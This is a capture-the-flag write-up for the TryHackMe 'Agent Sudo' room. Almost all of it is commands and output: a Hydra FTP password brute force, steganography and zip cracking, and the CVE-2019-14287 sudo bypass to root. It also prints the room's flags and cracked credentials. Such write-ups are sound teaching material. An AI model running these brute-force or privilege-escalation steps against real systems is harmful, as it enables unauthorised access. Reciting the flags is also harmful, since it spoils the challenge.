# TryHackMe — Agent Sudo
**Difficulty:** Easy
**Date:** June 29-30, 2026
**Author:** Ross Fisher

---

## Overview

Agent Sudo is a multi-layered box that chains together user-agent manipulation, FTP brute forcing, steganography across two different image formats, zip cracking, SSH access, and a well-known sudo CVE to get root. It also throws in a trivia question about a real-world hoax at the end. The box teaches you that steganography isn't always one tool — PNG and JPEG require completely different approaches.

**Flags:**
- User: `b03d975e8c92a7c04146cfa7a5a313c7`
- Root: `b53a02f55b57d4439e3341834d70c062`

**Credentials found:**
- chris:crystal (FTP brute force)
- james:hackerrules! (steghide extraction from cute-alien.jpg)

---

## Recon

### Nmap

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -Pn 10.146.163.170
```

Key ports:
- **21** — vsftpd 3.0.3
- **22** — OpenSSH 7.6p1
- **80** — Apache 2.4.29

### Web — User-Agent Manipulation

The main page said:

```
Dear agents,
Use your own codename as user-agent to access the site.
From, Agent R
```

The trick here is adding `-L` to curl to follow redirects — without it you just keep hitting the same announcement page regardless of which user-agent you try:

```bash
curl -sL http://10.146.163.170 -A "C"
```

Agent C was the right codename:

```
Attention chris,
Do you still remember our deal? Please tell agent J about the stuff ASAP.
Also, change your god damn password, is weak!
From, Agent R
```

This gives us a username — **chris** — and confirms the password is weak enough to brute force.

---

## FTP — Brute Forcing chris

Anonymous FTP didn't work on this box. Brute forced chris over FTP instead of SSH — FTP is significantly faster to crack due to less connection throttling:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.146.163.170
```

Cracked in about 1 minute:
```
[21][ftp] host: 10.146.163.170   login: chris   password: crystal
```

### FTP Contents

```bash
ftp 10.146.163.170
# login as chris:crystal
ftp> get To_agentJ.txt
ftp> get cute-alien.jpg
ftp> get cutie.png
```

The note revealed the next step:

```
Dear agent J,
All these alien like photos are fake! Agent R stored the real picture inside your
directory. Your login password is somehow stored in the fake picture.
From, Agent C
```

---

## Steganography — Two Images, Two Different Approaches

This is where the box gets interesting. PNG and JPEG require completely different steg tools.

### cute-alien.jpg — stegseek

steghide and stegseek don't support PNG, but they work great on JPEG. Running stegseek without a passphrase attempt first:

```bash
stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt
```

Output:
```
[i] Found passphrase: "Area51"
[i] Original filename: "message.txt"
[i] Extracting to "cute-alien.jpg.out"
```

```bash
cat cute-alien.jpg.out
```

```
Hi james,
Glad you find this message. Your login password is hackerrules!
Don't ask me why the password look cheesy, ask agent R who set this password for you.
Your buddy, chris
```

Username: **james**, password: **hackerrules!**

### cutie.png — binwalk + zip2john

steghide and stegseek both reject PNG files. The right approach for PNG is binwalk to detect embedded files:

```bash
binwalk cutie.png
```

Output showed an encrypted zip file embedded inside the PNG containing `To_agentR.txt`. Extracted it:

```bash
binwalk -e cutie.png
cd _cutie.png.extracted
zip2john *.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Cracked instantly: **alien**

The zip contained a note to Agent R — bonus lore, not critical for the main flags.

---

## Foothold — SSH as james

```bash
ssh james@10.146.163.170
# password: hackerrules!
```

User flag in james's home directory:
```
b03d975e8c92a7c04146cfa7a5a313c7
```

---

## Privilege Escalation — CVE-2019-14287

```bash
sudo -l
```

Output:
```
User james may run the following commands on agent-sudo:
    (ALL, !root) NOPASSWD: /bin/bash
```

The `(ALL, !root)` restriction is supposed to prevent running as root specifically. CVE-2019-14287 bypasses this by using UID -1 which sudo incorrectly maps to UID 0 (root):

```bash
sudo -u#-1 /bin/bash
whoami
# root
```

Root flag:
```bash
cat /root/root.txt
# b53a02f55b57d4439e3341834d70c062
```

---

## The Alien Autopsy Image

The root directory also contained `Alien_autospy.jpg` — a frame from the famous 1995 hoax footage created by Ray Santilli, marketed as real US military footage of an alien autopsy from the 1947 Roswell incident. The footage was later confirmed to be a constructed dummy filmed deliberately. The room asks what the incident depicted is called — the answer is **Roswell Alien Autopsy**.

To get the file from the target to Kali, SCP from james's home directory (not /root — SCP authenticates as james even when you've escalated to root):

```bash
scp james@10.146.163.170:/home/james/Alien_autospy.jpg ~/THM/
```

---

## Attack Chain Summary

```
Web → user-agent "C" + -L flag → username: chris, weak password
→ Hydra FTP brute force → chris:crystal
→ FTP download: cute-alien.jpg + cutie.png + note
→ stegseek on JPEG → passphrase: Area51 → james:hackerrules!
→ binwalk on PNG → embedded zip → zip2john → passphrase: alien → To_agentR.txt
→ SSH as james (hackerrules!)
→ sudo -u#-1 /bin/bash → CVE-2019-14287 → root
```

---

## What I Could Have Done Better

**1. Try FTP before SSH for brute forcing.** SSH brute force with Hydra against a real server is painfully slow — 290 tries/min. FTP cracked in under 60 seconds. When FTP is open and you have a username, try FTP first.

**2. Add -L to curl immediately.** When a user-agent manipulation page doesn't seem to respond to different agents, it's almost certainly redirecting. `-L` follows redirects and should be in the initial curl command, not an afterthought.

**3. Separate steg tools by file format.** steghide = JPEG only. stegseek = JPEG only. binwalk + zip2john = embedded files in any format including PNG. Running steghide against a PNG wastes time. Check the file type first and pick the right tool.

**4. SCP paths matter.** When you escalate to root inside an SSH session, SCP still authenticates as the original SSH user. File paths need to reflect where the file actually lives relative to what that user can access — not where root can see it.

**5. `-t 4` on Hydra for SSH.** Adding `-t 4` limits parallel threads to what SSH servers actually accept, which avoids connection rejections and can paradoxically speed things up.

---

## Key Lessons

**User-agent manipulation with curl** — always use `-L` to follow redirects, otherwise you'll think it isn't working when it actually is.

**PNG vs JPEG steganography** — these are fundamentally different. steghide/stegseek for JPEG, binwalk for detecting embedded files in PNG. zsteg is another good PNG-specific tool.

**FTP before SSH for brute forcing** — FTP has no real rate limiting. SSH does.

**CVE-2019-14287** — sudo `(ALL, !root)` restriction bypassed with `sudo -u#-1`. The `#-1` UID wraps around to 0 (root) in vulnerable sudo versions. Check sudo version: affected versions are below 1.8.28.

---

## Tools Used

- nmap
- curl (-L for redirect following, -A for user-agent)
- hydra (FTP brute force)
- ftp
- stegseek
- binwalk
- zip2john
- john
- ssh
- scp
